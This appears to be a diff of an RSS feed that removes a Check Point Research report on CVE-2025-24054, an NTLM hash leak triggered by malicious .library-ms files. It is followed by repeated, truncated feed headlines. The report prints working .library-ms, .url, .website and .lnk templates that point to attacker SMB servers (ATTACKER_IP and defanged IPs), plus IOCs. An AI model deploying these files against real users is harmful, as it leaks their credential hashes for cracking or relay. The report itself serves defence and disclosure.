-&lt;h2 class="wp-block-heading"&gt;Introduction&lt;/h2&gt;
-
-
-
-&lt;p&gt;&lt;strong&gt;NTLM (New Technology LAN Manager)&lt;/strong&gt; is a suite of authentication protocols developed by Microsoft to verify user identities and protect the integrity and confidentiality of network communications. NTLM operates through a direct client-server exchange known as the &lt;strong&gt;NTLM challenge/response mechanism&lt;/strong&gt;, in which the server challenges the client to prove its identity without sending the user&amp;#8217;s actual password over the network.&lt;/p&gt;
-
-
-
-&lt;p&gt;The original version, &lt;strong&gt;NTLMv1&lt;/strong&gt;, had several security flaws that made it vulnerable to attacks such as &lt;strong&gt;pass-the-hash&lt;/strong&gt; and &lt;strong&gt;rainbow table attacks&lt;/strong&gt;. In NTLMv1, the client responds to the server&amp;#8217;s challenge by sending a predictable hash of the user&amp;#8217;s password (the &lt;strong&gt;NT hash&lt;/strong&gt;). Attackers could try to crack the password offline or reuse this hash if they managed to intercept it. To reduce these risks, Microsoft introduced &lt;strong&gt;NTLMv2&lt;/strong&gt;, which significantly improves security by adding both a &lt;strong&gt;random server challenge&lt;/strong&gt; and a &lt;strong&gt;client challenge&lt;/strong&gt; into the authentication process. Instead of sending the NT hash directly, NTLMv2 generates a unique response known as the &lt;strong&gt;NTLMv2 response&lt;/strong&gt; (also referred to as the &lt;strong&gt;NTLMv2-SSP hash&lt;/strong&gt; or &lt;strong&gt;Net-NTLMv2&lt;/strong&gt;). This renders precomputed attacks (like rainbow tables and pass-the-hash) largely ineffective.&lt;/p&gt;
-
-
-
-&lt;p&gt;However, if attackers are able to capture these NTLMv2 responses, they can still attempt to &lt;strong&gt;brute-force&lt;/strong&gt; the hash offline or perform &lt;strong&gt;relay attacks&lt;/strong&gt;. NTLM relay attacks fall under the category of &lt;strong&gt;man-in-the-middle (MitM)&lt;/strong&gt; attacks that exploit the NTLM authentication protocol. Instead of cracking the password, the attacker captures the hash and passes it to another service to authenticate as the user. NTLM relay attacks are much more dangerous when the stolen credentials belong to a privileged user, as the attacker is using it for privilege escalation and lateral movement on the network.&lt;/p&gt;
-
-
-
-&lt;p&gt;In the past few months, Microsoft has been busy releasing security updates aimed at fixing NTLM Hash Disclosure vulnerabilities via spoofing. One such vulnerability, &lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-43451"&gt;&lt;strong&gt;CVE-2024-43451&lt;/strong&gt;&lt;/a&gt;, was patched on November 12, 2024, after it was exploited in a campaign targeting Ukraine. CERT-UA has linked this activity to UAC-0194, a threat actor believed to be connected to Russia. Fast forward to March 11, 2025, when Microsoft rolled out a patch for another similar vulnerability, &lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24054"&gt;&lt;strong&gt;CVE-2025-24054&lt;/strong&gt;&lt;/a&gt;, which also allows NTLM hash disclosure with very little user interaction. For CVE-2025-24054, users can trigger the attack simply by right-clicking or navigating to the folder that holds the maliciously crafted &lt;code&gt;.library-ms&lt;/code&gt; file.&lt;/p&gt;
-
-
-
-&lt;p&gt;Threat actors began actively exploiting CVE-2025-24054 just eight days after the patch was released. Since then, &lt;strong&gt;Check Point Research&lt;/strong&gt; has reported multiple &lt;strong&gt;malspam campaigns&lt;/strong&gt; leveraging this flaw, all observed within less than two weeks.&lt;/p&gt;
-
-
-
-&lt;h2 class="wp-block-heading"&gt;CVE-2025-24054&lt;/h2&gt;
-
-
-
-&lt;p&gt;Microsoft, on March 11, 2025, released a security patch protecting against a vulnerability in Windows Explorer that leaks &lt;strong&gt;NTLMV2-SSp&lt;/strong&gt; when a malicious &lt;code&gt;.library-ms&lt;/code&gt; file is extracted from a ZIP archive. This vulnerability was classified with the CVE ID, &lt;strong&gt;CVE-2025-24054&lt;/strong&gt; and was exploited in all the latest Windows versions. This vulnerability is triggered when a user extracts a ZIP archive containing a malicious &lt;code&gt;.library-ms&lt;/code&gt; file. This event will trigger Windows Explorer to initiate an SMB authentication request to a remote server and, as a result, it leaks the user’s NTLM hash without any user interaction.&lt;/p&gt;
-
-
-
-&lt;pre class="EnlighterJSRAW"&gt;&amp;lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&amp;lt;libraryDescription xmlns="&amp;lt;http://schemas.microsoft.com/windows/2009/library&gt;"&gt;
-  &amp;lt;searchConnectorDescriptionList&gt;
-    &amp;lt;searchConnectorDescription&gt;
-      &amp;lt;simpleLocation&gt;
-        &amp;lt;url&gt;\\\\ATTACKER_IP\\SHARE_NAME&amp;lt;/url&gt;
-      &amp;lt;/simpleLocation&gt;
-    &amp;lt;/searchConnectorDescription&gt;
-  &amp;lt;/searchConnectorDescriptionList&gt;
-&amp;lt;/libraryDescription&gt;
-&lt;/pre&gt;
-
-
-
-&lt;p&gt;The images below demonstrate network activity where a user’s &lt;strong&gt;NTLMV2-SSp hash&lt;/strong&gt; is leaked via SMB to a malicious SMB server at IP address &lt;code&gt;194.127.179[.]157&lt;/code&gt;. Once the user triggers the exploit with minimal interaction, the client initiates SMB requests. Upon processing the &lt;code&gt;NTLMSSP_AUTH&lt;/code&gt; message, the client inadvertently leaks the user’s NTLMV2-SSp to the malicious server.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31377" height="129" src="https://research.checkpoint.com/wp-content/uploads/2025/04/img_pcapv2-1024x129.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 1 — CVE-2025-24054, Exploit PCAP.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31378" height="257" src="https://research.checkpoint.com/wp-content/uploads/2025/04/img_pcapv21-Copy.png" width="717" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 2 — PCAP NTLMv2-SSP Hash.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Exposing a user’s NTLMV2-SSp hash allows the attacker to obtain the user’s password by brute force or perform relay attacks. If the compromised account has high privileges and improper mitigations (such as SMB signing and NTLM relay protections), this could lead to lateral movement, privilege escalation, or even full domain compromise.&lt;/p&gt;
-
-
-
-&lt;p&gt;Microsoft had initially assigned the vulnerability the CVE identifier &lt;strong&gt;CVE-2025-24071&lt;/strong&gt;, but it has since been updated to &lt;strong&gt;CVE-2025-24054&lt;/strong&gt;.&lt;/p&gt;
-
-
-
-&lt;h2 class="wp-block-heading"&gt;Campaigns Utilizing CVE-2025-24054&lt;/h2&gt;
-
-
-
-&lt;p&gt;Eight days after the Microsoft security patch, &lt;strong&gt;Check Point Research&lt;/strong&gt; discovered the first campaign utilizing &lt;strong&gt;CVE-2025-24054&lt;/strong&gt;. Until March 25, we have observed approximately another 10 campaigns with the end goal of retrieving NTLMV2-SSp hashes from the targeted victims. The SMB servers collecting those were hosted in Russia, Bulgaria, the Netherlands, Australia and Turkey.&lt;/p&gt;
-
-
-
-&lt;h3 class="wp-block-heading"&gt;NTLM Exploits Bomb Campaign&lt;/h3&gt;
-
-
-
-&lt;p&gt;The campaign appears to have occurred around March 20–21, 2025. The main targets seem to have been the Polish and Romanian governments and private institutions. The campaign targeted the victims via email phishing links, which include an archive file, downloaded from Dropbox. Once the user downloads and extracts the archive&amp;#8217;s contents, it triggers the exploit that leaks the NTLMV2-SSp hash.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31379" height="266" src="https://research.checkpoint.com/wp-content/uploads/2025/04/img_email.png" width="1005" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 3 — Email campaign.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p&gt;The archive &lt;code&gt;xd.zip&lt;/code&gt; was downloaded from Dropbox and contained files with the sole purpose of leaking NTLMV2-SSp hashes. Those four embedded files contacted a malicious SMB server with IP address &lt;code&gt;159.196.128[.]120&lt;/code&gt;.&lt;/p&gt;
-
-
-
-&lt;p&gt;&lt;strong&gt;1. xd.library-ms &amp;#8211; CVE-2025-24054&lt;/strong&gt;&lt;/p&gt;
-
-
-
-&lt;p&gt;Once the archive was unzipped, this file triggered &lt;strong&gt;CVE-2025-24054,&lt;/strong&gt; an NTLM Hash Disclosure Spoofing Vulnerability.&lt;/p&gt;
-
-
-
-&lt;pre class="EnlighterJSRAW"&gt;&amp;lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&amp;lt;libraryDescription xmlns="&amp;lt;http://schemas.microsoft.com/windows/2009/library&gt;"&gt;
-  &amp;lt;searchConnectorDescriptionList&gt;
-    &amp;lt;searchConnectorDescription&gt;
-      &amp;lt;simpleLocation&gt;
-        &amp;lt;url&gt;\\\\159.196.128[.]120\\shared&amp;lt;/url&gt;
-      &amp;lt;/simpleLocation&gt;
-    &amp;lt;/searchConnectorDescription&gt;
-  &amp;lt;/searchConnectorDescriptionList&gt;
-&amp;lt;/libraryDescription&gt;
-&lt;/pre&gt;
-
-
-
-&lt;p&gt;&lt;strong&gt;2. xd.url &amp;#8211; CVE-2024-43451&lt;/strong&gt;&lt;/p&gt;
-
-
-
-&lt;p&gt;The &lt;code&gt;.url&lt;/code&gt; file extension is used to create &lt;strong&gt;Internet shortcuts&lt;/strong&gt; that point to web addresses (URLs). URLs are plain text files that store a website&amp;#8217;s address. When you double-click a &lt;code&gt;.url&lt;/code&gt; file, your default web browser opens the corresponding URL. The &lt;strong&gt;&lt;code&gt;.url&lt;/code&gt;&lt;/strong&gt; file type can also reference network resources via a &lt;strong&gt;UNC (Universal Naming Convention)&lt;/strong&gt; path. A UNC path points to a network location, usually in the format:&lt;/p&gt;
-
-
-
-&lt;pre class="EnlighterJSRAW"&gt;\\\\ServerName\\SharedFolder\\Resource
-&lt;/pre&gt;
-
-
-
-&lt;p&gt;This path indicates a &lt;strong&gt;network share&lt;/strong&gt; (e.g., a shared folder or file on another machine). The connections created are primarily based on the &lt;strong&gt;network protocol&lt;/strong&gt; used and how the resource is shared. The most common type of connection established with UNC paths involves the &lt;strong&gt;Server Message Block (SMB)&lt;/strong&gt; protocol. Triggering files that support UNC paths can potentially lead to &lt;strong&gt;SMB (Server Message Block)&lt;/strong&gt; connections, which might expose sensitive information, including &lt;strong&gt;NTLMv2 hashes.&lt;/strong&gt; The &lt;code&gt;.url&lt;/code&gt; file embedded within this archive is associated with the &lt;strong&gt;CVE-2024-43451&lt;/strong&gt; vulnerability, which has been actively exploited in the wild. The exploitation involves &lt;strong&gt;.url files&lt;/strong&gt; containing malicious code capable of executing upon unusual user interactions. These interactions include &lt;strong&gt;right-clicking&lt;/strong&gt; the file, &lt;strong&gt;deleting&lt;/strong&gt; it, or performing a &lt;strong&gt;drag-and-drop operation&lt;/strong&gt;.&lt;/p&gt;
-
-
-
-&lt;pre class="EnlighterJSRAW"&gt;[InternetShortcut]
-URL=file://159.196.128[.]120/
-IconIndex=4
-HotKey=0
-IDList=
-IconFile=\\\\159.196.128[.]120\\share\\pentestlab.ico
-&lt;/pre&gt;
-
-
-
-&lt;p&gt;This CVE was previously exploited as a zero-day vulnerability and was used in attacks targeting Ukraine. According to &lt;strong&gt;CERT-UA&lt;/strong&gt;, the campaign was attributed to the threat actor &lt;strong&gt;UAC-0194&lt;/strong&gt;, which is suspected to be &lt;strong&gt;Russian-affiliated&lt;/strong&gt;.&lt;/p&gt;
-
-
-
-&lt;p&gt;&lt;strong&gt;3. xd.website&lt;/strong&gt;&lt;/p&gt;
-
-
-
-&lt;p&gt;The &lt;code&gt;.website&lt;/code&gt; file functions similarly to &lt;code&gt;.url&lt;/code&gt; files but with some extra metadata designed for modern web applications. These files store &lt;strong&gt;URL information&lt;/strong&gt; along with additional data such as &lt;strong&gt;browser settings&lt;/strong&gt;, &lt;strong&gt;app-specific settings&lt;/strong&gt;, and icons used for pinned web apps, making them slightly more advanced than the simpler &lt;code&gt;.url&lt;/code&gt; files. They could also potentially link to a &lt;strong&gt;local or network resource&lt;/strong&gt; via a UNC path, triggering an SMB connection once the user manually interacts with such files.&lt;/p&gt;
-
-
-
-&lt;pre class="EnlighterJSRAW"&gt;[{000214A0-0000-0000-C000-000000000046}]
-Prop3=19,2
-Prop4=31,go.microsoft.com
-[InternetShortcut]
-URL=file://159.196.128[.]120/
-[{A7AF692E-098D-4C08-A225-D433CA835ED0}]
-Prop5=3,0
-Prop9=19,0
-Prop2=65,2C0000000000000001000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF310000002B000000710600006204000056
-Prop6=3,1
-[{9F4C2855-9F79-4B39-A8D0-E1D42DE1D5F3}]
-Prop5=8,Microsoft.Website.B4BD2547.99055A5E
-&lt;/pre&gt;
-
-
-
-&lt;p&gt;&lt;strong&gt;4. xd.lnk&lt;/strong&gt;&lt;/p&gt;
-
-
-
-&lt;p&gt;The &lt;code&gt;.lnk&lt;/code&gt; file extension is used for &lt;strong&gt;Windows shortcuts&lt;/strong&gt;. A shortcut is essentially a pointer or reference to another file, folder, or program. When you double-click a &lt;code&gt;.lnk&lt;/code&gt; file, Windows automatically opens the linked target file or application, which can be a program, document, or can be used to point to a network resource using a &lt;strong&gt;UNC path&lt;/strong&gt;. Once the target path of an LNK file is a remote server, an SMB connection will be triggered, and upon the &lt;code&gt;NTLMSSP_AUTH&lt;/code&gt; message, the client inadvertently leaks the user’s NTLMV2-SSp. The LNK file below, distributed as part of this archive, requires manual user interaction to trigger the SMB connection. Bellow is the LNK metadata:&lt;/p&gt;
-
-
-
-&lt;pre class="EnlighterJSRAW"&gt;Target Path      : \\\\159.196.128.120
-Working Directory: None
-Arguments        : None
-Description      : None
-Icon Location    : None
-Relative Path    : ..\\..\\..\\..\\Windows
-Show Command     : Normal
-&lt;/pre&gt;
-
-
-
-&lt;p&gt;All the mentioned files, once clicked manually by the user, attempt to access the network share, initiating an SMB connection, which potentially could expose NTLMV2-SSp hashes to the malicious actor. However, two of those files that used exploits did not even require the user to take such actions. The SMB server at &lt;code&gt;159.196.128[.]120&lt;/code&gt; harvested such hashes, likely for use in further attack operations. In January 2024, cybersecurity firm &lt;strong&gt;HarfangLab&lt;/strong&gt; reported this IP as being linked to &lt;strong&gt;APT28,&lt;/strong&gt; also known as &lt;strong&gt;Fancy Bear&lt;/strong&gt; or &lt;strong&gt;Forest Blizzard&lt;/strong&gt; a Russian state-sponsored threat actor. However, at this time, we have no further information directly associating this IP with the mentioned APT group.&lt;/p&gt;
-
-
-
-&lt;h3 class="wp-block-heading"&gt;Email Campaign with Non-archived &lt;code&gt;.library-ms&lt;/code&gt;&lt;/h3&gt;
-
-
-
-&lt;p&gt;Initial reports indicated that exploitation was triggered once the &lt;code&gt;.library-ms&lt;/code&gt; file was unzipped. However, on March 25, 2025, Check Point Research discovered a campaign targeting companies around the world, distributing these files without being zipped. According to Microsoft, &lt;em&gt;this exploit is triggered with minimal user interaction with a malicious file, such as selecting (single-clicking), inspecting (right-clicking), or performing any action other than opening or executing the file&lt;/em&gt;.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31380" height="758" src="https://research.checkpoint.com/wp-content/uploads/2025/04/img_cmp2_eml.png" width="942" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 4 — Unzipped Exploit file.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p&gt;At this stage, unzipping the file was merely a side effect that triggered the exploit, with the actual cause being any minimal user interaction that could activate it, such as navigating to the folder where the file is located. As soon as victims downloaded the exploit, their NTLMV2-SSp hashes were leaked.&lt;/p&gt;
-
-
-
-&lt;pre class="EnlighterJSRAW"&gt;&amp;lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&amp;lt;libraryDescription xmlns="&amp;lt;http://schemas.microsoft.com/windows/2009/library&gt;"&gt;
-  &amp;lt;searchConnectorDescriptionList&gt;
-    &amp;lt;searchConnectorDescription&gt;
-      &amp;lt;simpleLocation&gt;
-        &amp;lt;url&gt;\\\\194.127.179[.]157\\data&amp;lt;/url&gt;
-      &amp;lt;/simpleLocation&gt;
-    &amp;lt;/searchConnectorDescription&gt;
-  &amp;lt;/searchConnectorDescriptionList&gt;
-&amp;lt;/libraryDescription&gt;
-&lt;/pre&gt;
-
-
-
-&lt;p&gt;Observed Attacker’s emails:&lt;/p&gt;
-
-
-
-&lt;pre class="EnlighterJSRAW"&gt;1900001905[@]stu.iku.edu.tr
-estgv18503[@]alunos.estgv.ipv.pt
-m.elbadawy01791[@]com.dmu.edu.eg
-m.ghallab01992[@]com.dmu.edu.eg
-patricio.estay99895[@]edu.ipchile.cl
-poveda.l.2346[@]istlam.edu.ec
-thanakornn65[@]nu.ac.th
-ul0251085[@]edu.uni.lodz.pl
-walaa.20185492[@]buc.edu.eg
-&lt;/pre&gt;
-
-
-
-&lt;h2 class="wp-block-heading"&gt;Conclusion&lt;/h2&gt;
-
-
-
-&lt;p&gt;The discovery and subsequent exploitation of &lt;strong&gt;CVE-2025-24054&lt;/strong&gt;, a vulnerability involving &lt;strong&gt;NTLM Hash Disclosure Spoofing&lt;/strong&gt;, underscores the growing sophistication of cyberattacks and the urgency for prompt patching and vigilance. Despite Microsoft releasing a security update on &lt;strong&gt;March 11, 2025&lt;/strong&gt; to address the issue, the vulnerability was actively exploited less than two weeks later in campaigns targeting government and private institutions in &lt;strong&gt;Poland&lt;/strong&gt; and &lt;strong&gt;Romania&lt;/strong&gt;. These attacks leveraged malicious &lt;code&gt;.library-ms&lt;/code&gt; files to collect &lt;strong&gt;NTLMv2 hashes&lt;/strong&gt; and escalate the risk of &lt;strong&gt;lateral movement&lt;/strong&gt; and &lt;strong&gt;privilege escalation&lt;/strong&gt; within compromised networks.&lt;/p&gt;
-
-
-
-&lt;p&gt;This rapid exploitation highlights the critical need for organizations to apply patches immediately and ensure that &lt;strong&gt;NTLM vulnerabilities&lt;/strong&gt; are addressed in their environments. The minimal user interaction required for the exploit to trigger and the ease with which attackers can gain access to &lt;strong&gt;NTLM hashes&lt;/strong&gt; make it a significant threat, especially when such hashes can be used in &lt;strong&gt;pass-the-hash&lt;/strong&gt; attacks. With the ongoing evolution of these attack vectors, staying ahead of the threat requires a proactive approach to both &lt;strong&gt;patch management&lt;/strong&gt; and &lt;strong&gt;network security&lt;/strong&gt;, as attackers continually adapt to find new ways to exploit weaknesses.&lt;/p&gt;
-
-
-
-&lt;h2 class="wp-block-heading"&gt;Protections&lt;/h2&gt;
-
-
-
-&lt;p&gt;Check Point Threat Emulation provides comprehensive coverage of the attacks described in this report.&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;&lt;/ul&gt;
-
-
-
-&lt;h2 class="wp-block-heading"&gt;Indicators of Compromise&lt;/h2&gt;
-
-
-
-&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Description&lt;/th&gt;&lt;th&gt;Value&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;Archive NTLM Exploits Bomb&lt;/td&gt;&lt;td&gt;9ca72d969d7c5494a30e996324c6c0fcb72ae1ae&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;xd.website&lt;/td&gt;&lt;td&gt;84132ae00239e15b50c1a20126000eed29388100&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;xd.url&lt;/td&gt;&lt;td&gt;76e93c97ffdb5adb509c966bca22e12c4508dcaa&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;xd.library-ms&lt;/td&gt;&lt;td&gt;7dd0131dd4660be562bc869675772e58a1e3ac8e&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;xd.lnk&lt;/td&gt;&lt;td&gt;5e42c6d12f6b51364b6bfb170f4306c5ce608b4f&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;NTLM Exploits Bomb Endpoint&lt;/td&gt;&lt;td&gt;159.196.128[.]120&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Unzipped Exploits&lt;/td&gt;&lt;td&gt;054784f1a398a35e0c5242cbfa164df0c277da73&lt;br /&gt;7a43c177a582c777e258246f0ba818f9e73a69ab&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Unzipped Campaign Endpoint&lt;/td&gt;&lt;td&gt;194.127.179[.]157&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
-
-
-
-&lt;h2 class="wp-block-heading"&gt;References&lt;/h2&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;&lt;a href="https://github.com/FOLKS-iwd/CVE-2025-24071-msfvenom"&gt;https://github.com/FOLKS-iwd/CVE-2025-24071-msfvenom&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24054"&gt;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24054&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;a href="https://cti.monster/blog/2025/03/18/CVE-2025-24071.html"&gt;https://cti.monster/blog/2025/03/18/CVE-2025-24071.html&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;a href="https://www.clearskysec.com/0d-vulnerability-exploited-in-the_wild/"&gt;https://www.clearskysec.com/0d-vulnerability-exploited-in-the_wild/&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;a href="https://harfanglab.io/insidethelab/compromised-routers-infrastructure-target-europe-caucasus/"&gt;https://harfanglab.io/insidethelab/compromised-routers-infrastructure-target-europe-caucasus/&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;a href="https://www.vaadata.com/blog/understanding-ntlm-authentication-and-ntlm-relay-attacks/"&gt;https://www.vaadata.com/blog/understanding-ntlm-authentication-and-ntlm-relay-attacks/&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/cve-2025-24054-ntlm-exploit-in-the-wild/"&gt;CVE-2025-24054, NTLM Exploit in the Wild&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://research.checkpoint.com/?p=31376</guid><category>Check Point Research Publications</category></item><item><title>Network Security Policy</title><link>https://www.techrepublic.com/resource-library/it-policy/network-security/</link><description>Protect company data and reputation by ensuring the network is secured from unauthorized access, data loss, malware infestations, and security breaches. Customizable Document — Ready for use as-is or for edits. Enhance Your Security — This six-page document looks at configuration guidelines, physical and system security, and more. Expertly-Curated — Written by Scott Matteson through ...</description><guid isPermaLink="false">https://www.techrepublic.com/resource-library/whitepapers/network-security-policy/</guid><category>Cybersecurity</category><category>IT Resources</category><category>Networking</category></item><item><title>CrazyHunter Campaign Targets Taiwanese Critical Sectors</title><link>https://www.trendmicro.com/en_us/research/25/d/crazyhunter-campaign.html</link><description>This blog entry details research on emerging ransomware group CrazyHunter, which has launched a sophisticated campaign aimed at Taiwan's essential services.</description><guid isPermaLink="false">urn:uuid:beb8f883-032a-c07c-3a2f-00cf8a5c155f</guid><category>Trend Micro Research : Endpoints</category><category>Trend Micro Research : Ransomware</category><category>Trend Micro Research : Research</category><category>Trend Micro Research : Articles, News, Reports</category></item><item><title>Android phones will soon reboot themselves after sitting unused for 3 days</title><link>https://arstechnica.com/gadgets/2025/04/android-phones-will-soon-reboot-themselves-after-sitting-unused-for-3-days/</link><description>The latest Google update will make your phone more secure if you don't touch it</description><content:encoded>&lt;p&gt;A silent update rolling out to virtually all Android devices will make your phone more secure, and all you have to do is not touch it for a few days. The new feature implements auto-restart of a locked device, which will make your personal data harder to extract. It's coming as part of a Google Play Services update, though, so there's nothing you can do to speed along the process.&lt;/p&gt;
+&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/21st-april-threat-intelligence-report/"&gt;21st April – Threat Intelligence Report&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://research.checkpoint.com/?p=31405</guid><category>Global Cyber Attack Reports</category></item><item><title>Zero Day Quest 2025: $1.6 million awarded for vulnerability research</title><link>https://msrc.microsoft.com/blog/2025/04/zero-day-quest-2025-1.6-million-awarded-for-vulnerability-research/</link><description>This month, the Microsoft Security Response Center recently welcomed some of the world’s most talented security researchers at Microsoft’s Zero Day Quest, the largest live hacking competition of its kind. The inaugural event challenged the security community to focus on the highest-impact security scenarios for Copilot and Cloud with up to $4 million in potential awards.</description><guid isPermaLink="false">https://msrc.microsoft.com/blog/2025/04/zero-day-quest-2025-1.6-million-awarded-for-vulnerability-research/</guid></item><item><title>Hiring Kit: Cryptographer</title><link>https://www.techrepublic.com/resource-library/hiring-kit/cryptographer/</link><description>Hire the best cryptographer to develop algorithms, ciphers, and other encryption systems to protect sensitive data. Boost Cybersecurity – Cryptographers uses their expertise in mathematics and computer science to defend your business from threats. Streamline Hiring – Get an optimized job description, interview questions, and job advert to simplify recruitment. Expert-Crafted Framework – Written by ...</description><guid isPermaLink="false">https://www.techrepublic.com/resource-library/whitepapers/hiring-kit-cryptographer/</guid><category>Cybersecurity</category><category>Hiring Kits</category><category>HR Resources</category><category>IT Resources</category></item><item><title>Information Security Policy</title><link>https://www.techrepublic.com/resource-library/it-policy/information-security/</link><description>Safeguard company information, reduce business and legal risks, and protect company investments and reputation with this IT policy. Fully Customizable — Good to use as-is or change as you see fit. Improve Your Information Security — This 10-page document offers everything you need to create a secure environment. Expert Authorship — Created by Scott Matteson ...</description><guid isPermaLink="false">https://www.techrepublic.com/resource-library/whitepapers/information-security-policy/</guid><category>Cybersecurity</category><category>Data</category><category>IT Resources</category></item><item><title>FOG Ransomware Spread by Cybercriminals Claiming Ties to DOGE</title><link>https://www.trendmicro.com/en_us/research/25/d/fog-ransomware-concealed-within-binary-loaders-linking-themselve.html</link><description>This blog details our investigation of malware samples that conceal within them a FOG ransomware payload.</description><guid isPermaLink="false">urn:uuid:6a1f8c52-507f-6692-6e46-0869e5fc34e6</guid><category>Trend Micro Research : Articles, News, Reports</category><category>Trend Micro Research : Ransomware</category><category>Trend Micro Research : Research</category></item><item><title>16-31 December 2024 Cyber Attacks Timeline</title><link>https://www.hackmageddon.com/2025/04/18/16-31-december-2024-cyber-attacks-timeline/</link><description>In the second timeline of December 2024, I collected 94 events with a threat landscape dominated by malware with...</description><guid isPermaLink="false">https://www.hackmageddon.com/?p=44588</guid><category>Cyber Attacks Timelines</category><category>Security</category><category>2024</category><category>Cyber Attacks</category><category>Cyber Crime</category><category>Cyber Espionage</category><category>Cyber Warfare</category><category>December</category><category>Hacktivism</category><category>Malware</category><category>Phishing</category><category>Ransomware</category><category>Timeline</category></item><item><title>Disaster Recovery and Business Continuity Plan</title><link>https://www.techrepublic.com/resource-library/guide/disaster-recovery-and-business-continuity-plan/</link><description>IT pros can use this plan to create policies that address critical elements and processes that should be considered and implemented before a crisis occurs. Customizable Document — Ready for use as-is or for edits. Enhance Your Processes — This 10-page document outlines critical systems, data selection, compliance, and more. Expertly-Curated — Written by Scott ...</description><guid isPermaLink="false">https://www.techrepublic.com/resource-library/whitepapers/disaster-recovery-and-business-continuity-plan/</guid><category>Cybersecurity</category><category>IT Resources</category><category>Software</category><category>Tech &amp; Work</category></item><item><title>Possible National Security Crisis Averted: CISA’s Reversal Extends Support for CVE Database</title><link>https://www.techrepublic.com/article/news-mitre-cisa-contract-expiration-cve-database/</link><description>CISA executed the option period on MITRE’s contract to keep the essential CVE cybersecurity database running.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4302130</guid><category>Cybersecurity</category><category>International</category><category>News</category><category>bugcrowd</category><category>CISA</category><category>common vulnerabilities and exposures</category><category>common weakness enumeration</category><category>cve</category><category>cve foundation</category><category>cwe</category><category>cybersecurity</category><category>department of homeland security</category><category>incident response</category><category>mitre</category><category>vulnerability management</category></item><item><title>Network Security Policy</title><link>https://www.techrepublic.com/resource-library/it-policy/network-security/</link><description>Protect company data and reputation by ensuring the network is secured from unauthorized access, data loss, malware infestations, and security breaches. Customizable Document — Ready for use as-is or for edits. Enhance Your Security — This six-page document looks at configuration guidelines, physical and system security, and more. Expertly-Curated — Written by Scott Matteson through ...</description><guid isPermaLink="false">https://www.techrepublic.com/resource-library/whitepapers/network-security-policy/</guid><category>Cybersecurity</category><category>IT Resources</category><category>Networking</category></item><item><title>CrazyHunter Campaign Targets Taiwanese Critical Sectors</title><link>https://www.trendmicro.com/en_us/research/25/d/crazyhunter-campaign.html</link><description>This blog entry details research on emerging ransomware group CrazyHunter, which has launched a sophisticated campaign aimed at Taiwan's essential services.</description><guid isPermaLink="false">urn:uuid:beb8f883-032a-c07c-3a2f-00cf8a5c155f</guid><category>Trend Micro Research : Endpoints</category><category>Trend Micro Research : Ransomware</category><category>Trend Micro Research : Research</category><category>Trend Micro Research : Articles, News, Reports</category></item><item><title>Android phones will soon reboot themselves after sitting unused for 3 days</title><link>https://arstechnica.com/gadgets/2025/04/android-phones-will-soon-reboot-themselves-after-sitting-unused-for-3-days/</link><description>The latest Google update will make your phone more secure if you don't touch it</description><content:encoded>&lt;p&gt;A silent update rolling out to virtually all Android devices will make your phone more secure, and all you have to do is not touch it for a few days. The new feature implements auto-restart of a locked 